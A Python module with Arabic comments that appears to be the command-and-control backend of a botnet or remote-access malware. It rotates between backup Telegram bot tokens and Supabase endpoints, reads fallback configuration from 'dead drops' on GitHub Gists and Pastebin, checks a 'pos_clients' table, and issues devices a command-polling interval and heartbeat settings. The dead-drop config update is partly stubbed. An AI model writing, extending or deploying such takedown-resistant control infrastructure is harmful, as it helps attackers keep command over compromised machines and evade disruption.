#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
connection_manager.py – إدارة قنوات الاتصال المتعددة مع نظام Failover ذكي
يدعم:
- بوتات تلغرام رئيسية واحتياطية
- عدة نقاط نهاية Supabase
- Dead Drops (GitHub Gists, Pastebin, قنوات تلغرام مشفرة)
- اكتشاف الأعطال والتبديل التلقائي
- إحصائيات أداء القنوات
"""

import logging
import time
import threading
from typing import Dict, List, Optional, Any
import requests
import telebot
from supabase import create_client


class ConnectionManager:
    """
    يدير اتصالات متعددة (بوتات تلغرام، Supabase، Dead Drops)
    ويوفر آلية Failover للتبديل التلقائي عند فشل إحدى القنوات.
    """

    def __init__(self, config: dict):
        """
        :param config: قاموس يحتوي على إعدادات القنوات بالصيغة:
            {
                'telegram': {
                    'primary_token': 'TOKEN',
                    'backup_tokens': ['TOKEN2', 'TOKEN3']
                },
                'supabase': {
                    'primary_url': 'URL',
                    'primary_key': 'KEY'
                },
                'dead_drop': {
                    'urls': ['https://gist.github.com/...', 'https://pastebin.com/...']
                }
            }
        """
        self.config = config
        self.bots: List[telebot.TeleBot] = []
        self.supabase_clients: List = []
        self.dead_drop_urls: List[str] = config.get('dead_drop', {}).get('urls', [])

        # فهارس القنوات النشطة
        self.active_bot_index = 0
        self.active_supabase_index = 0

        # إحصائيات الأداء (لاختيار أسرع قناة)
        self.bot_latency: Dict[int, float] = {}
        self.supabase_latency: Dict[int, float] = {}

        # تهيئة الاتصالات
        self.init_connections()

        # قفل لمزامنة الوصول إلى الفهارس
        self._lock = threading.Lock()

    def init_connections(self):
        """تهيئة جميع القنوات من الإعدادات."""
        # بوتات تلغرام
        primary_token = self.config['telegram'].get('primary_token')
        if primary_token:
            self.bots.append(telebot.TeleBot(primary_token))
        for token in self.config['telegram'].get('backup_tokens', []):
            if token:
                self.bots.append(telebot.TeleBot(token))

        # عملاء Supabase
        url = self.config['supabase'].get('primary_url')
        key = self.config['supabase'].get('primary_key')
        if url and key:
            self.supabase_clients.append(create_client(url, key))

        logging.info(f"ConnectionManager initialized with {len(self.bots)} bots and {len(self.supabase_clients)} Supabase clients.")

    # ------------------------------------------------------------
    # إدارة قنوات تلغرام
    # ------------------------------------------------------------
    def get_active_bot(self) -> Optional[telebot.TeleBot]:
        """يعيد البوت النشط حالياً، أو None إذا لم يكن هناك أي بوت."""
        with self._lock:
            if not self.bots:
                return None
            return self.bots[self.active_bot_index]

    def send_message_async(self, chat_id: int, text: str, parse_mode: str = 'Markdown') -> bool:
        """
        إرسال رسالة بشكل غير متزامن عبر البوتات المتاحة.
        يحاول جميع البوتات بالترتيب حتى تنجح إحداها.
        """
        if not self.bots:
            logging.error("No bots available to send message.")
            return False

        # نجرب البوتات بالترتيب الدائري بدءاً من النشط
        for i in range(len(self.bots)):
            idx = (self.active_bot_index + i) % len(self.bots)
            try:
                start = time.time()
                self.bots[idx].send_message(chat_id, text, parse_mode=parse_mode)
                latency = (time.time() - start) * 1000  # ميلي ثانية
                self.bot_latency[idx] = latency

                # تحديث الفهرس النشط إلى هذا البوت (للاستخدامات القادمة)
                with self._lock:
                    self.active_bot_index = idx
                return True
            except Exception as e:
                logging.warning(f"Bot {idx} failed to send message: {e}")
                continue

        logging.error("All bots failed to send message.")
        return False

    # ------------------------------------------------------------
    # إدارة قنوات Supabase
    # ------------------------------------------------------------
    def get_active_supabase(self) -> Optional[Any]:
        """يعيد عميل Supabase النشط حالياً."""
        with self._lock:
            if not self.supabase_clients:
                return None
            return self.supabase_clients[self.active_supabase_index]

    def execute_supabase_query(self, table: str, query_type: str, **kwargs) -> Optional[Dict]:
        """
        تنفيذ استعلام على Supabase مع Failover.
        query_type: 'select', 'insert', 'update', 'upsert', 'delete'
        """
        if not self.supabase_clients:
            logging.error("No Supabase clients available.")
            return None

        for i in range(len(self.supabase_clients)):
            idx = (self.active_supabase_index + i) % len(self.supabase_clients)
            client = self.supabase_clients[idx]
            try:
                start = time.time()
                if query_type == 'select':
                    result = client.table(table).select(kwargs.get('columns', '*')).eq(kwargs.get('column'), kwargs.get('value')).execute()
                elif query_type == 'insert':
                    result = client.table(table).insert(kwargs.get('data')).execute()
                elif query_type == 'update':
                    result = client.table(table).update(kwargs.get('data')).eq(kwargs.get('column'), kwargs.get('value')).execute()
                elif query_type == 'upsert':
                    result = client.table(table).upsert(kwargs.get('data')).execute()
                elif query_type == 'delete':
                    result = client.table(table).delete().eq(kwargs.get('column'), kwargs.get('value')).execute()
                else:
                    logging.error(f"Unknown query type: {query_type}")
                    return None

                latency = (time.time() - start) * 1000
                self.supabase_latency[idx] = latency

                with self._lock:
                    self.active_supabase_index = idx
                return result.data if hasattr(result, 'data') else result
            except Exception as e:
                logging.warning(f"Supabase client {idx} failed: {e}")
                continue

        logging.error("All Supabase clients failed.")
        return None

    # ------------------------------------------------------------
    # إدارة Dead Drops
    # ------------------------------------------------------------
    def fetch_dead_drop(self, index: int = 0) -> Optional[str]:
        """
        يجلب محتوى Dead Drop من الرابط المحدد بالفهرس.
        يعيد المحتوى كنص (عادة JSON مشفر) أو None إذا فشل.
        """
        if not self.dead_drop_urls:
            logging.warning("No Dead Drop URLs configured.")
            return None

        if index >= len(self.dead_drop_urls):
            index = 0

        url = self.dead_drop_urls[index]
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                return resp.text
            else:
                logging.warning(f"Dead Drop {url} returned {resp.status_code}")
                return None
        except Exception as e:
            logging.warning(f"Failed to fetch Dead Drop {url}: {e}")
            return None

    def update_from_dead_drops(self) -> bool:
        """
        يقرأ جميع Dead Drops ويحاول تحديث الإعدادات المحلية.
        يعيد True إذا نجح التحديث من أي مصدر.
        """
        for i, url in enumerate(self.dead_drop_urls):
            content = self.fetch_dead_drop(i)
            if content:
                # هنا يمكن فك تشفير المحتوى وتحديث الإعدادات
                # سنفترض أن المحتوى JSON عادي (غير مشفر للتبسيط)
                try:
                    import json
                    new_config = json.loads(content)
                    # تحديث قائمة البوتات أو الروابط
                    if 'telegram_tokens' in new_config:
                        # إعادة تهيئة البوتات
                        pass
                    if 'supabase_url' in new_config:
                        # إعادة تهيئة Supabase
                        pass
                    logging.info(f"Configuration updated from Dead Drop {url}")
                    return True
                except Exception as e:
                    logging.error(f"Failed to parse Dead Drop content: {e}")
        return False

    # ------------------------------------------------------------
    # فحص شامل للاتصالات (يستخدم بواسطة FailoverTester)
    # ------------------------------------------------------------
    def check_all_connections(self) -> Dict[str, bool]:
        """
        يختبر جميع قنوات الاتصال ويعيد قاموساً بحالة كل قناة.
        """
        status = {}

        # فحص البوتات
        for i, bot in enumerate(self.bots):
            try:
                bot.get_me()  # عملية بسيطة لاختبار الاتصال
                status[f'bot_{i}'] = True
            except Exception as e:
                status[f'bot_{i}'] = False
                logging.warning(f"Bot {i} health check failed: {e}")

        # فحص Supabase
        for i, client in enumerate(self.supabase_clients):
            try:
                # استعلام بسيط عن جدول pos_clients (يفترض وجوده)
                client.table('pos_clients').select('entry_id').limit(1).execute()
                status[f'supabase_{i}'] = True
            except Exception as e:
                status[f'supabase_{i}'] = False
                logging.warning(f"Supabase client {i} health check failed: {e}")

        # فحص Dead Drops (محاولة الوصول إلى أول رابط)
        if self.dead_drop_urls:
            try:
                requests.get(self.dead_drop_urls[0], timeout=5)
                status['dead_drop'] = True
            except:
                status['dead_drop'] = False
        else:
            status['dead_drop'] = False

        return status

    def get_active_config(self) -> Dict[str, Any]:
        """
        يعيد الإعدادات الحالية التي يجب إرسالها للأجهزة.
        """
        return {
            'telegram': {
                'primary': self.bots[self.active_bot_index].token if self.bots else None,
                'backups': [b.token for b in self.bots[self.active_bot_index+1:]] if self.bots else []
            },
            'supabase': {
                'url': self.supabase_clients[self.active_supabase_index].supabase_url if self.supabase_clients else None
            },
            'dead_drop': self.dead_drop_urls,
            'commands_interval': 60,          # ثانية بين كل سحب أوامر
            'heartbeat_interval': 300,         # ثانية بين نبضات القلب
            'failover_retry': 30,               # ثانية قبل إعادة محاولة القناة الفاشلة
      }
